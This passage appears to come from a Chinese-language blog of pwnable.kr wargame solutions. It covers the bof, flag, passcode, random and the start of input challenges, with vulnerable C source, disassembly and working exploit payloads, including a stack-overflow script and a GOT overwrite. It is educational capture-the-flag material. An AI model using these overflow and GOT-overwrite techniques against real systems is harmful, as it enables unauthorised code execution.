"\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p><a href="https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times" target="_blank" rel="noopener">https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times</a></p><h2 id="3-bof"><a href="#3-bof" class="headerlink" title="3. bof"></a>3. bof</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在 Ninja 中，可以方便看到逻辑判断</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15907181567512.jpg" alt="-w815"></p><p>我们来看下C语言函数调用栈的典型内存布局</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15907189598255.jpg" alt></p><p>因为存储变量时是从低地址开始覆盖的，所以从 ebp-0x2c 到 ebp+0x8，我们需要覆盖长度 0x34 的数据，然后覆盖变量值为0xcafebabe</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4. flag"></a>4. flag</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><pre class=" language-plain"><code class="language-plain">Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binary</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先拿到题目，直接拖进 Ninja 可以发觉是加了壳的，简单识别下可以看到是 upx 壳</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15907233766982.jpg" alt="-w411"></p><p>利用<code>upx -d</code>脱壳</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ '/home/pwn/tools/upx-3.96-amd64_linux/upx' -d flag                        Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2020UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    883745 <-    335288   37.94%   linux/amd64   flagUnpacked 1 file.</code></pre><p>查看下 main 函数，注意到字符串存储的位置</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15907236039631.jpg" alt="-w452"></p><p>点进去看下，可以看到上面的那串应该就是 flag 了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15907235836712.jpg" alt="-w994"></p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ strings flag | grep ':)'UPX...? sounds like a delivery service :)</code></pre><h2 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5. passcode"></a>5. passcode</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> passcode1<span class="token punctuation">;</span>    <span class="token keyword">int</span> passcode2<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode1 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode2 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checking...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>passcode1<span class="token operator">==</span><span class="token number">338150</span> <span class="token operator">&amp;&amp;</span> passcode2<span class="token operator">==</span><span class="token number">13371337</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login OK!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login Failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter you name : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%100s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome %s!\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Toddler's Secure Login System 1.0 beta.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// something after login...</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now I can safely trust you that you have credential :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>利用 scp 把题目拷下来</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/tools/die_lin64_portable$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode ./passcode@pwnable.kr's password: passcode                                          100% 7485     7.3KB/s   00:01</code></pre><p>再来检测下程序开启了哪些保护措施，注意到 PIE 没有开启</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ checksec passcode [*] '/home/pwn/桌面/passcode'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>回到代码，注意到<code>scanf(&quot;%d&quot;, passcode1);</code>这段代码是有问题的，首先考虑直接溢出覆盖passcode1 以及 passcode2，338150 == 0x000528e6已经出现了0x00截断，因此无法实现变量覆盖</p><p>那么直接覆盖RET呢？注意到开启了 Canary，需要绕过，暂时不会:(</p><p>但是注意到 PIE 没有开启，而且passcode1前面没有取地址符号<code>&amp;</code>，我们可以覆盖内存地址为passcode1的数据内容</p><p>这样我们通过将 passcode1 设置为 fflush 的 GOT 表单，通过 scanf 将调用地址指向 <code>system(&quot;/bin/cat flag&quot;);</code> 达成绕过认证获取 flag，大致步骤如下：</p><ol><li><p>从 name 到 passcode1 的长度为 (ebp+0x70) - (ebp-0x10) = 0x80 == 96</p></li><li><p>看一下 fflush 的 GOT 地址为0x0804a004</p><pre class=" language-shell"><code class="language-shell"> pwn@pwn-Parallels-Virtual-Platform:~/桌面$ objdump -R passcode  passcode：     文件格式 elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET   TYPE              VALUE  08049ff0 R_386_GLOB_DAT    __gmon_start__ 0804a02c R_386_COPY        stdin@@GLIBC_2.0 0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0 0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0 0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4 0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0 0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0 0804a014 R_386_JUMP_SLOT   __gmon_start__ 0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0 0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0 0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</code></pre></li><li><p>再通过 gdb 查看 <code>system(&quot;/bin/cat flag&quot;);</code> 开始调用的指令地址为 0x080485e3，同时注意到scanf 传参时为<code>%d</code>，所以需要转换成 int 型数据</p><pre class=" language-armasm"><code class="language-armasm"> (gdb) disassemble login Dump of assembler code for function login:    0x08048564 <+0>:     push   %ebp    0x08048565 <+1>:     mov    %esp,%ebp    0x08048567 <+3>:     sub    $0x28,%esp    0x0804856a <+6>:     mov    $0x8048770,%eax    0x0804856f <+11>:    mov    %eax,(%esp)    0x08048572 <+14>:    call   0x8048420 <printf@plt>    0x08048577 <+19>:    mov    $0x8048783,%eax    0x0804857c <+24>:    mov    -0x10(%ebp),%edx    0x0804857f <+27>:    mov    %edx,0x4(%esp)    0x08048583 <+31>:    mov    %eax,(%esp)    0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>    0x0804858b <+39>:    mov    0x804a02c,%eax    0x08048590 <+44>:    mov    %eax,(%esp)    0x08048593 <+47>:    call   0x8048430 <fflush@plt>    0x08048598 <+52>:    mov    $0x8048786,%eax    0x0804859d <+57>:    mov    %eax,(%esp)    .    .    .    0x080485d7 <+115>:   movl   $0x80487a5,(%esp)    0x080485de <+122>:   call   0x8048450 <puts@plt>    0x080485e3 <+127>:   movl   $0x80487af,(%esp)    0x080485ea <+134>:   call   0x8048460 <system@plt>    0x080485ef <+139>:   leave      0x080485f0 <+140>:   ret        0x080485f1 <+141>:   movl   $0x80487bd,(%esp)    0x080485f8 <+148>:   call   0x8048450 <puts@plt>    0x080485fd <+153>:   movl   $0x0,(%esp)    0x08048604 <+160>:   call   0x8048480 <exit@plt> End of assembler dump.</code></pre></li></ol><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">passcode@pwnable:~$ python -c "print 'A' * 96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcodeToddler's Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :)</code></pre><h2 id="6-random"><a href="#6-random" class="headerlink" title="6. random"></a>6. random</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> random<span class="token punctuation">;</span>    random <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// random value!</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>key <span class="token operator">^</span> random<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xdeadbeef</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong, maybe you should try 2^32 cases.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>因为直接 random 为伪随机，我们只需要知道程序中生成的值是多少就可以直接拿来利用了</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> disassemble mainDump of assembler code for function main:   0x00000000004005f4 <+0>:   push   rbp   0x00000000004005f5 <+1>:   mov    rbp,rsp   0x00000000004005f8 <+4>:   sub    rsp,0x10   0x00000000004005fc <+8>:   mov    eax,0x0   0x0000000000400601 <+13>:  call   0x400500 <rand@plt>   0x0000000000400606 <+18>:  mov    DWORD PTR [rbp-0x4],eax   0x0000000000400609 <+21>:  mov    DWORD PTR [rbp-0x8],0x0   0x0000000000400610 <+28>:  mov    eax,0x400760   0x0000000000400615 <+33>:  lea    rdx,[rbp-0x8]   0x0000000000400619 <+37>:  mov    rsi,rdx   0x000000000040061c <+40>:  mov    rdi,rax   0x000000000040061f <+43>:  mov    eax,0x0   0x0000000000400624 <+48>:  call   0x4004f0 <__isoc99_scanf@plt>   0x0000000000400629 <+53>:  mov    eax,DWORD PTR [rbp-0x8]   0x000000000040062c <+56>:  xor    eax,DWORD PTR [rbp-0x4]   0x000000000040062f <+59>:  cmp    eax,0xdeadbeef   0x0000000000400634 <+64>:  jne    0x400656 <main+98>   0x0000000000400636 <+66>:  mov    edi,0x400763   0x000000000040063b <+71>:  call   0x4004c0 <puts@plt>   0x0000000000400640 <+76>:  mov    edi,0x400769   0x0000000000400645 <+81>:  mov    eax,0x0   0x000000000040064a <+86>:  call   0x4004d0 <system@plt>   0x000000000040064f <+91>:  mov    eax,0x0   0x0000000000400654 <+96>:  jmp    0x400665 <main+113>   0x0000000000400656 <+98>:  mov    edi,0x400778   0x000000000040065b <+103>: call   0x4004c0 <puts@plt>   0x0000000000400660 <+108>: mov    eax,0x0   0x0000000000400665 <+113>: leave     0x0000000000400666 <+114>: ret    End of assembler dump.</code></pre><p>可以确认 random 存在 rbp-0x4，输入值存在 rbp-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15909964922295.jpg" alt></p><p>注意小端存储，所以 random=0x6b8b4567</p><p>输入值：0x6b8b4567 ^ 0xdeadbeef = 3039230856</p><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">random@pwnable:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable...</code></pre><h2 id="7-input"><a href="#7-input" class="headerlink" title="7. input"></a>7. input</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// argv</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// stdio</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// env</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// file</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// network</span>    <span class="token keyword">int</span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_in saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>saddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">;</span>    cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// here's your flag</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span 